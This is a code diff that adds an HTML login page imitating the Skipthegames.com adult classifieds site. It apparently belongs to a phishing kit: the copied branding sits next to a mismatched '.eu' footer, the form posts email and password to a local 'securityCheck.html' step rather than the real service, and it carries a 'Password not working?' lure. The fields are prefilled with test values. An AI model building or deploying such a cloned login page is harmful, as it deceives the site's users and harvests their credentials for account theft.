@@ -1,0 +1,119 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: "Helvetica", "Helvetica Neue", Arial, sans-serif;
+    }
+  </style>
+</head>
+<body class="lg:w-[71%] w-[90.5%] mx-auto pt-[27px] lg:pt-[24px]">
+  <div>
+    <!-- logo -->
+    <img src="./images/logo.png" class="lg:w-[255px] w-36"  alt="">
+    <p class="text-[11px] pb-[10px] text-[#222222]">Skip the games. Get <br class="lg:hidden flex"> satisfaction.</p>
+
+	<!-- form -->
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-[32px] ">
+      <div>
+        <h3 class="text-[20px] lg:text-[27px] text-[#222222]">Log in to your account</h3>
+        <div class="mt-2">
+          <form action="securityCheck.html" class="">
+            <input
+              name="email"
+              class="w-full lg:w-[409px] text-sm px-[8px] py-[7px] mb-5 outline-none border border-slate-300 focus:border-[#222222a4] focus:bg-[#00000002] shadow-inner transition duration-300"
+              placeholder="Your email"
+              type="email"
+              required=""
+              value="fdsf"
+            />
+            <input
+              id="password"
+              name="password"
+              class="w-full lg:w-[409px] text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-[#222222a4] focus:bg-[#00000002] shadow-inner transition duration-300"
+              placeholder="Password"
+              type="password"
+              autocomplete="on"
+              required=""
+              value="fdsf"
+            />
+            <p class="cursor-pointer text-custom-rose underline text-xs mt-[2px] mb-4 text-[#990033]" id="togglePassword">Hide Password</p>
+            <button
+              type="submit"
+              class="w-full lg:w-[409px] bg-[#2ba6cb] hover:bg-[#258cac] py-[14px] text-white transition duration-300 rounded"
+            >
+              Log in
+            </button>
+          </form>
+        </div>
+
+		<p class="text-[#ff0000] font-bold mt-[21px]">Password not working? <span class="underline text-[#990033]">Click here</span></p>
+		<p class="text-[10px] text-[#222222] pt-[3px] pb-[22px] leading-6">By clicking "Log in", you accept Skipthegames.com's Terms and Conditions of Use</p>
+		<p class="text-[10px] text-[#222222] leading-6">This site is protected by hCaptcha and its Privacy Policy and Terms of Service apply.</p>
+       
+      </div>
+
+	  <!--right div -->
+      <div class="hidden lg:flex flex-col">
+        <h3 class="text-[22px] lg:text-[27px] text-[#222222]">
+          First time here?
+        </h3>
+        <p class="mt-[9px] text-custom-rose underline cursor-pointer text-[#777777]">
+          Post your first ad
+        </p>
+      </div>
+    </div>
+
+	<!-- footer -->
+	 <hr class="mt-10 text-[#dddddd]">
+	 <div class="lg:pb-7 pb-[0px]" >
+        <div
+          class="py-[19px] flex lg:gap-[178px] lg:flex-row flex-col lg:items-center lg:space-y-0 space-y-4 text-custom-gray  "
+        >
+          <div class="">
+            <p class="cursor-pointer lg:pb-0 pb-2 text-[#777777] hover:text-[#383434]">
+              ©Skipthegames.eu
+            </p>
+          </div>
+          <div class="flex flex-wrap gap-[3px]  lg:space-x-0 lg:gap-[22px]">
+            <div class="first:text-custom-gray text-custom-cyan">
+              <p class="cursor-pointer text-[#777777] hover:text-black lg:pr-0 pr-5">Home</p>
+            </div>
+            <div class="first:text-custom-gray text-custom-cyan">
+              <p class="cursor-pointer text-[#777777] hover:text-black lg:pr-0 pr-5">Contact</p>
+            </div>
+            <div class="first:text-custom-gray text-custom-cyan">
+              <p class="cursor-pointer text-[#777777] hover:text-black lg:pr-0 pr-5">About</p>
+            </div>
+            <div class="first:text-custom-gray text-custom-cyan">
+              <p class="cursor-pointer text-[#777777] hover:text-black lg:pr-0 pr-5">Privacy</p>
+            </div>
+            <div class="first:text-custom-gray text-custom-cyan">
+              <p class="cursor-pointer text-[#777777] hover:text-black lg:pr-0 pr-5">Terms</p>
+            </div>
+            <div class="first:text-custom-gray text-custom-cyan">
+              <p class="cursor-pointer text-[#777777] hover:text-black lg:pr-0 pr-5">Escort Info</p>
+            </div>
+          </div>
+        </div>
+      </div>
+  </div>
+
+  <script>
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+
+    togglePassword.addEventListener('click', function() {
+      // Toggle the type attribute
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+
+      // Toggle the text
+      this.textContent = type === 'password' ? 'Show Password' : 'Hide Password';
+    });
+  </script>
+</body>
+</html>
